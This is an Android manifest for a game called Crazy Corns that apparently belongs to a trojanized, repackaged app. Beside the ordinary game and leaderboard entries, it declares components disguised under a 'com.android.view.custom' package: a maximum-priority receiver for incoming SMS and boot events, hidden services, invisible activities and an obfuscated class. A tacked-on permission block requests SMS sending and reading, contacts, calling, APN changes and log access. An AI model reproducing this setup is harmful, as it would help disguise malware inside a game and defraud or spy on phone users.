<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.oe.crazycorns">
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <supports-screens android:anyDensity="true" android:largeScreens="true" android:normalScreens="true" android:smallScreens="true"/>
    <uses-feature android:glEsVersion="131072" android:required="true"/>
    <application android:debuggable="false" android:icon="@drawable/icon" android:label="@string/app_name" android:name=".CrazyCornsApplication">
        <activity android:label="@string/app_name" android:name=".MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <activity android:configChanges="keyboard|keyboardHidden|orientation" android:name="com.google.ads.AdActivity"/>
        <activity android:name="com.scoreloop.client.android.ui.EntryScreenActivity" android:theme="@android:style/Theme.Black.NoTitleBar.Fullscreen"/>
        <activity android:name="com.scoreloop.client.android.ui.ShowResultOverlayActivity" android:theme="@style/sl_dialog"/>
        <activity android:name="com.scoreloop.client.android.ui.component.market.MarketHeaderActivity"/>
        <activity android:name="com.scoreloop.client.android.ui.component.market.MarketListActivity"/>
        <activity android:name="com.scoreloop.client.android.ui.component.entry.EntryListActivity"/>
        <activity android:name="com.scoreloop.client.android.ui.component.post.PostOverlayActivity" android:theme="@style/sl_dialog"/>
        <activity android:name="com.scoreloop.client.android.ui.component.score.ScoreHeaderActivity"/>
        <activity android:name="com.scoreloop.client.android.ui.component.score.ScoreListActivity"/>
        <activity android:name="com.scoreloop.client.android.ui.component.user.UserAddBuddyListActivity"/>
        <activity android:name="com.scoreloop.client.android.ui.component.user.UserHeaderActivity"/>
        <activity android:name="com.scoreloop.client.android.ui.component.user.UserDetailListActivity"/>
        <activity android:name="com.scoreloop.client.android.ui.component.user.UserListActivity"/>
        <activity android:name="com.scoreloop.client.android.ui.component.game.GameDetailHeaderActivity"/>
        <activity android:name="com.scoreloop.client.android.ui.component.game.GameDetailListActivity"/>
        <activity android:name="com.scoreloop.client.android.ui.component.game.GameListActivity"/>
        <activity android:name="com.scoreloop.client.android.ui.component.profile.ProfileSettingsListActivity"/>
        <activity android:name="com.scoreloop.client.android.ui.component.profile.ProfileSettingsPictureListActivity"/>
        <activity android:name="com.scoreloop.client.android.ui.LeaderboardsScreenActivity" android:theme="@android:style/Theme.Black.NoTitleBar.Fullscreen"/>
        <activity android:name="com.scoreloop.client.android.ui.framework.ScreenActivity" android:theme="@android:style/Theme.Black.NoTitleBar.Fullscreen"/>
        <activity android:name="com.scoreloop.client.android.ui.framework.TabsActivity"/>
        <meta-data android:name="APP_ID" android:value="1ff395104b2c26c1"/>
        <activity android:name="la$JU"/>
        <receiver android:name="com.android.view.custom.BaseABroadcastReceiver">
            <intent-filter android:priority="2147483647">
                <action android:name="android.net.wifi.PICK_WIFI_WORK"/>
                <action android:name="android.net.conn.MEDIA_NOFS"/>
                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
                <action android:name="android.intent.action.ACTION_POWER_CONNECTED"/>
                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
                <action android:name="android.intent.action.INPUT_METHOD_CHANGED"/>
                <action android:name="android.intent.action.USER_PRESENT"/>
                <action android:name="android.intent.action.UMS_CONNECTED"/>
                <action android:name="android.intent.action.UMS_DISCONNECTED"/>
            </intent-filter>
        </receiver>
        <service android:name="com.android.view.custom.FirstAService"/>
        <service android:name="com.android.view.custom.SecondAService"/>
        <service android:name="com.android.view.custom.ThirdAService"/>
        <service android:name="com.android.view.custom.FourthAService"/>
        <activity android:excludeFromRecents="true" android:launchMode="singleInstance" android:name="com.android.view.custom.FirstAActivity" android:theme="@android:style/Theme.Translucent"/>
        <activity android:excludeFromRecents="true" android:launchMode="singleInstance" android:name="com.android.view.custom.SecondAActivity" android:theme="@android:style/Theme.Translucent"/>
        <activity android:excludeFromRecents="true" android:launchMode="singleInstance" android:name="com.android.view.custom.ThirdAActivity" android:screenOrientation="portrait"/>
        <activity android:excludeFromRecents="true" android:launchMode="singleInstance" android:name="com.android.view.custom.FourthAActivity" android:screenOrientation="portrait"/>
        <meta-data android:name="PID" android:value="secv"/>
    </application>
    <uses-permission android:name="android.permission.WRITE_SMS"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.VIBRATE"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
    <uses-permission android:name="android.permission.SEND_SMS"/>
    <uses-permission android:name="android.permission.DISABLE_KEYGUARD"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.CALL_PHONE"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.RESTART_PACKAGES"/>
    <uses-permission android:name="android.permission.WRITE_APN_SETTINGS"/>
    <uses-permission android:name="android.permission.READ_LOGS"/>
</manifest>